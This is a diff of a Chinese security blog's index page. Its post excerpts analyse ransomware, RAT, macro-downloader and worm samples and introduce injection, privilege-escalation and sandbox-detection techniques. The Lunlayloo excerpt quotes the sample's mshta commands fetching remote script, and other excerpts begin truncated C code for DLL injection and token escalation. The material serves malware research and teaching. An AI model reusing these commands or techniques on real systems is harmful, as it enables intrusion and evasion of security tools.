@@ -1,84 +1,150 @@
-
- <!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="zh-CN">
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="author" content="Cray">
+  <meta name="keywords" content>
+  <title>CrayBlog</title>
+
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+<link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+<link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="/lib/fancybox/jquery.fancybox.min.css">
+
+
   
-    <title>CrayBlog</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
-    
-    <meta name="author" content="Cray">
-    
-    <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
-    
-    
-    
-    
-    
-    <link rel="icon" href="/img/favicon.ico">
-    
-    
-    <link rel="apple-touch-icon" href="/img/pacman.jpg">
-    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
-    
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-146435492-1"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'GA_MEASUREMENT_ID');
-    </script>
+
+
 
 </head>
-</html>
-  <body>
-    <header>
-      <div>
-		
-			<div id="imglogo">
-				<a href="/"><img src="/img/logo.svg" alt="CrayBlog" title="CrayBlog"/></a>
-			</div>
-			
-			<div id="textlogo">
-				<h1 class="site-name"><a href="/" title="CrayBlog">CrayBlog</a></h1>
-				<h2 class="blog-motto"></h2>
-			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
-			</a></div>
-			<nav class="animated">
-				<ul>
-					
-						<li><a href="/">Home</a></li>
-					
-						<li><a href="/archives">Archives</a></li>
-					
-					<li>
-					
-					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
-						<label>Search</label>
-						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="搜索" />
-						<input type="hidden" name="q" value="site:L0yy.github.io">
-					</form>
-					
-					</li>
-				</ul>
-			</nav>			
-</div>
 
-    </header>
-    <div id="container">
-      <div id="main">
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/10/病毒报告/" title="tesla勒索病毒分析" itemprop="url">
-  
-    <h1 itemprop="name">tesla勒索病毒分析</h1>
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/default.png')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="fa fa-angle-down scroll-down-arrow"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
     
-     
-           <p itemprop="description" >基本信息 1
+      <div class="container nopadding-md">
+        <div class="py-5 z-depth-3" id="board">
+          
+          <div class="container">
+            <div class="row">
+              <div class="col-12 col-md-10 m-auto">
+                
+
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/10/病毒报告/">
+        <p class="h4 index-header">tesla勒索病毒分析</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">基本信息 1
 简介 2
 流程图 3
 详细分析 3
@@ -93,21 +159,61 @@
 创建互斥体 10
 获取一些权限 10
 获取文件校验 11
-对抗常见监控软件 </p>
-        
-    
-    <time datetime="2019-09-10T11:11:22.000Z" itemprop="datePublished">2019-09-10</time>
-  </a>
-</section>
+对抗常见监控软件 12
+删除卷影 13
+生成AES需要的密钥 14
+加入开机启动 15
+生成勒索文本和图片 15
+加密文件 17
+展示勒索信息 19
+发送信息到C2服务器 19
+样本朔源 21
+查杀方案 21
+总结 21
+基本信息文件: C:\Users\john\Documents\dorjlo.exe
+大小: 240640 字节
+修改时间: 2017年11月25日, 16:57:32
+MD5: 72CCC18F3038E19273010D45AC2142CE
+SHA1: A47612524C64636C2ADB2FE01E09DFEFACB78ACA
+CRC32: DAA773C2
+简介该木马为勒索软件，对抗常见监控软件，释放文件到其他目录，删除自身躲避怀疑，动态解密访问敏感字API，加入开机启动，持久会攻击
+流程图
+详细分</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/06/Lunlayloo 木马/" title="Lunlayloo 木马" itemprop="url">
-  
-    <h1 itemprop="name">Lunlayloo 木马</h1>
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-10&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E5%8A%A0%E5%AF%86%20%E5%8B%92%E7%B4%A2">加密 勒索</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >基本信息
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/06/Lunlayloo 木马/">
+        <p class="h4 index-header">Lunlayloo 木马</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">基本信息
 
 
 FileName
@@ -129,42 +235,150 @@ rat
 
 
 
-该样本语言类型为 VBS和JS编写，</p>
-        
-    
-    <time datetime="2019-09-06T11:11:22.000Z" itemprop="datePublished">2019-09-06</time>
-  </a>
-</section>
+该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/05/ida查找检测虚拟机代码/" title="IDA 查找检测虚拟机代码" itemprop="url">
-  
-    <h1 itemprop="name">IDA 查找检测虚拟机代码</h1>
+
+
+
+
+流程图
+详细分析文件有宏，且宏有密码，可以使用offkey直接更改宏密码进入宏代码后在shell(fun)处下断，可以拿到shell 的连接地址 mshta http://bit.ly/8hsshjahassahsh
+打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的拿出来使用console打印出来处理后执行了WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide看看究竟是什么东西木马作者选择了一个匿名代码存放地址网站，来逃避追踪。但是目前这个RWA地址页面已经被删除了这个样本在a</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-06&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Rat%20H-worm">Rat H-worm</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >FindAntiVM 来自github
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/05/ida查找检测虚拟机代码/">
+        <p class="h4 index-header">IDA 查找检测虚拟机代码</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">FindAntiVM 来自github
 如果找到，以红色标注
 from idautils import *
 from idc import *
 
 heads = Heads(SegStart(ScreenEA()), SegEnd(ScreenEA()))
 
-#Calls to </p>
-        
-    
-    <time datetime="2019-09-05T11:11:22.000Z" itemprop="datePublished">2019-09-05</time>
-  </a>
-</section>
+#Calls to autorun/autorunsc -- these hide signed MS entries!!
+pill_check = [&#39;sidt&#39;, &#39;sgdt&#39;, &#39;sldt&#39;, &#39;smsw&#39;, &#39;str&#39;, &#39;in&#39;]
+malicious_check = [&#39;cmd&#39;,&#39;cpuid&#39;,&#39;autorun&#39;, &#39;autorunsc&#39;]
+vmware_check = [&#39;Vmtoolsd&#39;, &#39;Vmwaretrat&#39;, &#39;Vmwareuser&#39;, &#39;Vmacthlp&#39;]
+vbox_check =</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/04/H-WORM变种远控分析/" title="H-WORM变种远控分析" itemprop="url">
-  
-    <h1 itemprop="name">H-WORM变种远控分析</h1>
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-05&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/IDA">IDA</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >基本信息
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/04/Com添加过滤器来检测沙箱/">
+        <p class="h4 index-header">Com组建检测虚拟沙箱</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。
+但经测试 any.run 和微步 都未被识别为沙箱
+这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。
+#include &quot;stdafx.h&quot;
+#include &lt;conio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;dshow.h&gt;
+#include &lt;objbase.h&gt;
+
+#pragma comment(lib, &quot;Strmiids.lib&quot;)
+
+void useCom()
+{
+    /*
+    这些只是一些随机检查，以确保恶意软件在真实系统上执行。
+    只有安装了音频设备，此处的沙箱才会被视为真实系统。
+    大多数仿真器都会失败，因为几乎不可能为现代操作系统中的每个COM接口实现适当的支持。
+    */
+    CoInitialize(0);
+    wchar_t * filerName = L&quot;random_nam</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-04&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E6%A3%80%E6%B5%8B%E6%B2%99%E7%AE%B1">检测沙箱</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/04/H-WORM变种远控分析/">
+        <p class="h4 index-header">H-WORM变种远控分析</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">基本信息
 
 
 FileName
@@ -180,54 +394,97 @@ rat
 403845 bytes
 
 
-简介该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全</p>
-        
-    
-    <time datetime="2019-09-04T11:11:22.000Z" itemprop="datePublished">2019-09-04</time>
-  </a>
-</section>
+简介该样本语言类型为 VBS和JS编写，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。
+流程图
+详细分析这个样本母体总共会释放3个脚本
+脚本1首先我们看看4gdrwceq60b7dbl.sct，这个样本的母体，是一个sct格式的文件这是Visual FoxPro的表单配置文件我们用Sublimi Text来打开它，记事本也是可以的。
+利用组数来存关键字符串，通过字符串的拼接来合成完整路径会尝试删除%APPDATA%\\taskmgr.js  这个文件文件中有很长一段密文，这里我改名为了EncodeList，通过System.IO.MemoryStream.WriteByte()方法把数据读入数据流中。最重要的是使用ADODB.Stream类方法把这个数据流保存到了被上面删除掉的%APPDATA%\\taskmgr.js文件中最后使用WScript.S</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/04/Com添加过滤器来检测沙箱/" title="Com组建检测虚拟沙箱" itemprop="url">
-  
-    <h1 itemprop="name">Com组建检测虚拟沙箱</h1>
-    
-     
-           <p itemprop="description" >因为沙箱的仿真度不全问题，可能造成仿真系统上的音频设备功能与真机的差异，通过这来实现检测是否在沙箱中运行。
-但经测试 any.run 和微步 都未被识别为沙箱
-这里只是介绍下可以使用COM对系统基础设备的操作，来检测虚拟沙箱。
-#include &amp;quot;stdafx.h&amp;qu</p>
+      <div>
         
-    
-    <time datetime="2019-09-04T11:11:22.000Z" itemprop="datePublished">2019-09-04</time>
-  </a>
-</section>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-04&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/Rat%20H-worm">Rat H-worm</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/03/替换特权指令 提升权限/" title="替换特权指令 提升权限" itemprop="url">
-  
-    <h1 itemprop="name">替换特权指令 提升权限</h1>
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >什么是特权
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/03/替换特权指令 提升权限/">
+        <p class="h4 index-header">替换特权指令 提升权限</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">什么是特权
 注意，这里说的提权不是从Administrator提升到 System,只是开启一些Administrator组的特殊权限
-Administrator组管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是SeDebugPrivilege，要是进程拥有了这个权限，</p>
-        
-    
-    <time datetime="2019-09-03T11:11:22.000Z" itemprop="datePublished">2019-09-03</time>
-  </a>
-</section>
+Administrator组管理员组一般权限比较多，但是很多都禁用了,我们这里需要的是SeDebugPrivilege，要是进程拥有了这个权限，就能对任意进程进行操作（包括system）
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/02/利用弱口令传播横向的远控组件/" title="弱口令横向传播" itemprop="url">
-  
-    <h1 itemprop="name">弱口令横向传播</h1>
+
+
+当用户试图执行一个特权操作，系统检查用户的访问令牌以确定使用是否具有必要的特权。调用GetTokenInformation函数可以检查特权。
+
+我要做的就是找到找到一个系统中有SeDebugPrivilege权限的令牌，然后复制下来，把自己的令牌改为他这个，然乎自己就拥有了SeDebugPrivilege权限了。这也就是提升权限的核心。
+下图是我使用 OpenProcess对SID为4的系统进程进行操作，且操作权限是PROCESS_ALL_ACCESS
+
+下面看看具体实现
+void CgPivilige()
+{
+    BOOL retn;
+    HANDLE hToken;
+    retn = OpenProcessToken(GetCurrentProc</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-03&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E6%8F%90%E6%9D%83">提权</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >@[toc]
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/02/利用弱口令传播横向的远控组件/">
+        <p class="h4 index-header">弱口令横向传播</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">@[toc]
 基本信息
 
 
@@ -244,21 +501,47 @@ rat
 28160 bytes
 
 
-简介此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运</p>
-        
-    
-    <time datetime="2019-09-02T11:11:22.000Z" itemprop="datePublished">2019-09-02</time>
-  </a>
-</section>
+简介此木马拥有横向传播能力扫描局域网主机，利用弱口令尝试登陆，上传运行自身，这样来传播。该木马会获取并上传被害者系统配置，方便进一步攻击，木马中有接收命令，执行命令的模块，也是这个木马的核心，达到执行作者发过来的命令该木马主要使用壳伪装自己，让安全软件不能找到敏感关键字符串，从而躲避安全软件的查杀。
+流程图
+详细分析程序加了两个壳，一个压缩壳UPX，一个Armadillo 都能用PEID插件脱掉
+点击脱壳之后修复下导入表就好了，修复之后查壳效果
+静态分析导入函数还有很多字符串就不列了，格式都是这种。从字符串中能看出，该样本有命令执行，联网，创建服务，处理资源数据，操作注册表的功能基本也就能猜测是释放资源段文件到新文件，然后加入服务启动，来达到启动的目的，下面看啊可能具体操作。
+动态加IDA该样本定义大量局部变量，使用硬编码方式存储数据移动到ascii上，右键char就可以看到字</div>
+        </div>
+      </a>
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/09/01/宏病毒下载器/" title="宏病毒" itemprop="url">
-  
-    <h1 itemprop="name">宏病毒</h1>
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-02&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/malware%20Rat">malware Rat</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >基本信息
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/09/01/宏病毒下载器/">
+        <p class="h4 index-header">宏病毒</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">基本信息
 
 
 FileName
@@ -280,219 +563,287 @@ Downloader
 
 
 
-带有恶意宏的office文件，加载dll，</p>
-        
-    
-    <time datetime="2019-09-01T11:11:22.000Z" itemprop="datePublished">2019-09-01</time>
-  </a>
-</section>
+带有恶意宏的office文件，加载dll，下载程序执行
 
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/08/26/输入法注入/" title="输入法注入" itemprop="url">
-  
-    <h1 itemprop="name">输入法注入</h1>
+
+
+
+
+流程图
+详细分析有宏，会在你允许宏运行的时候执行起来首先会切换目录到TMPT下
+然后会调用窗体UserFrom1的Show方法,也就值展示提示窗体在展示的时候会执行UserFrom_Activate()函数，也就会调用CreatGifFile这个方法这个方法在模块 modle1中定义拼接在TEMP下的路径，根据系统位数走不同分支，我这里是win7 32位下面会拷贝本身到上面拼接好的路径 TempName中，然后复制到ZipName中会把ZipName文件按压缩包打开，取出xl\embeddings\oleObject1.bin保存到Tmp\oleObject.bin中最后会调用ReadAndWriteExtractedBinFile函数，这个函数是在oleObject.bin中找到MZ开</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-09-01&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E6%A0%B7%E6%9C%AC%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90">样本详细分析</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/malware%20downloader">malware downloader</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-     
-           <p itemprop="description" >特性因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/08/26/输入法注入/">
+        <p class="h4 index-header">输入法注入</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">特性因为输入法的本身特性，能注入任何一个程序，还可以开机启动，很是友好
 网上大都是一个版本方法，我记录下我自己过程
 思路1.编写一个正常的输入法2.将它安装到电脑上，并设置为默认输入法，这样就可以在程序打开的时候就调用它的处理函数
-因为输入是一个特殊的dll，本质就是一个dll，</p>
+因为输入是一个特殊的dll，本质就是一个dll，只是后最不同而已。
+一个最简ime文件都必须两个函数
+一个dllmain() 还有一个ImeInquire()这两个是必须的
+编写输入法主要文件创建一个dll项目,解释都在注释中（注意项目为多字节字符集）dllmain.cpp
+#include &quot;stdafx.h&quot;
+#include &quot;windows.h&quot;
+#include &quot;imm.h&quot;
+#include &quot;immdev.h&quot;
+#pragma comment(lib,&quot;imm32.lib&quot;)
+
+LPCSTR injectDllPaht = &quot;C://expDll.dll&quot;; //我们最终利用的Dll，写入自己的功能
+void injectD</div>
+        </div>
+      </a>
+
+      <div>
         
-    
-    <time datetime="2019-08-26T11:11:22.000Z" itemprop="datePublished">2019-08-26</time>
-  </a>
-</section>
-
-  <section class="post" itemscope itemprop="blogPost">
-  
-    <a href="/2019/08/26/远线程注入/" title="远线程注入" itemprop="url">
-  
-    <h1 itemprop="name">远线程注入</h1>
-    
-     
-           <p itemprop="description" >什么是远线程注入在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达</p>
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-26&nbsp;&nbsp;
         
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E6%B3%A8%E5%85%A5">注入</a>&nbsp;
+          
+            <a href="/tags/%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8">开机启动</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
     
-    <time datetime="2019-08-26T02:11:22.000Z" itemprop="datePublished">2019-08-26</time>
-  </a>
-</section>
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/08/26/远线程注入/">
+        <p class="h4 index-header">远线程注入</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">什么是远线程注入在一个进程中，调用CreateThread或CreateRemoteThreadEx函数，在另一个进程内创建一个线程（因为不在同一个进程中，所以叫做远程线程）。创建的线程一般为Windows API函数LoadLibrary，来加载一个动态链接库(DLL)，从而达到在另一个进程中运行自己所希望运行的代码的目的。
+代码下面例子是根据查询一打开窗口中的计算器进程，然后注释都很详细 
+#include &quot;windows.h&quot;
+#include &quot;Tlhelp32.h&quot;
+int InjectDll(DWORD dwProcessId, PTCHAR szDllName);
+int EnablePrivilege(bool isStart);
+DWORD GetProcessId(PTCHAR pszProcessName);
+
+void main()
+{
+    DWORD ProcessId = GetProcessId(&quot;calc.exe&quot;);\\目标程序
+    InjectDll(ProcessId ,&quo</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-08-26&nbsp;&nbsp;
+        
+        
+          <i class="iconfont icon-inbox"></i>
+          
+            <a href="/categories/%E9%80%86%E5%90%91">逆向</a>&nbsp;
+          &nbsp;
+        
+        
+          <i class="iconfont icon-tag"></i>
+          
+            <a href="/tags/%E6%B3%A8%E5%85%A5">注入</a>&nbsp;
+          
+        
+      </div>
+    </div>
+  </div>
 
 
-  <nav id="page-nav" class="clearfix">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+
+  <nav aria-label="index posts navigation">
+    <ul class="pagination pg-blue justify-content-center mt-5">
+      
+      
+      
+        <li class="page-item">
+          <a class="page-link" href="/page/2/#board">下一页</a>
+        </li>
+      
+    </ul>
   </nav>
 
-</div>
-      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
-<div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
-<aside class="clearfix">
 
-  
-<div class="categorieslist">
-	<p class="asidetitle">分类</p>
-		<ul>
-		
-			<li><a href="/categories/CTF/" title="CTF">CTF<sup>7</sup></a></li>
-		
-			<li><a href="/categories/Docker/" title="Docker">Docker<sup>1</sup></a></li>
-		
-			<li><a href="/categories/Git/" title="Git">Git<sup>1</sup></a></li>
-		
-			<li><a href="/categories/docker/" title="docker">docker<sup>1</sup></a></li>
-		
-			<li><a href="/categories/博客/" title="博客">博客<sup>2</sup></a></li>
-		
-			<li><a href="/categories/样本详细分析/" title="样本详细分析">样本详细分析<sup>5</sup></a></li>
-		
-			<li><a href="/categories/编程/" title="编程">编程<sup>3</sup></a></li>
-		
-			<li><a href="/categories/课堂学习/" title="课堂学习">课堂学习<sup>1</sup></a></li>
-		
-			<li><a href="/categories/课堂笔记/" title="课堂笔记">课堂笔记<sup>9</sup></a></li>
-		
-			<li><a href="/categories/逆向/" title="逆向">逆向<sup>13</sup></a></li>
-		
-		</ul>
-</div>
-
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+  </main>
 
   
-<div class="tagslist">
-	<p class="asidetitle">标签</p>
-		<ul class="clearfix">
-		
-			<li><a href="/tags/Angr/" title="Angr">Angr<sup>1</sup></a></li>
-		
-			<li><a href="/tags/DVWA/" title="DVWA">DVWA<sup>2</sup></a></li>
-		
-			<li><a href="/tags/GCC/" title="GCC">GCC<sup>1</sup></a></li>
-		
-			<li><a href="/tags/HCIP/" title="HCIP">HCIP<sup>2</sup></a></li>
-		
-			<li><a href="/tags/IDA/" title="IDA">IDA<sup>3</sup></a></li>
-		
-			<li><a href="/tags/OD/" title="OD">OD<sup>1</sup></a></li>
-		
-			<li><a href="/tags/PE/" title="PE">PE<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Python/" title="Python">Python<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Rat-H-worm/" title="Rat H-worm">Rat H-worm<sup>2</sup></a></li>
-		
-			<li><a href="/tags/SEH/" title="SEH">SEH<sup>1</sup></a></li>
-		
-			<li><a href="/tags/SQL注入/" title="SQL注入">SQL注入<sup>1</sup></a></li>
-		
-			<li><a href="/tags/TCP/" title="TCP">TCP<sup>1</sup></a></li>
-		
-			<li><a href="/tags/TcpDump/" title="TcpDump">TcpDump<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Win32/" title="Win32">Win32<sup>1</sup></a></li>
-		
-			<li><a href="/tags/Windbg/" title="Windbg">Windbg<sup>1</sup></a></li>
-		
-			<li><a href="/tags/coding/" title="coding">coding<sup>1</sup></a></li>
-		
-			<li><a href="/tags/dll/" title="dll">dll<sup>1</sup></a></li>
-		
-			<li><a href="/tags/docker/" title="docker">docker<sup>1</sup></a></li>
-		
-			<li><a href="/tags/github/" title="github">github<sup>1</sup></a></li>
-		
-			<li><a href="/tags/git密钥生成以及安装/" title="git密钥生成以及安装">git密钥生成以及安装<sup>1</sup></a></li>
-		
-		</ul>
-</div>
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
 
-
-</aside>
-</div>
+  
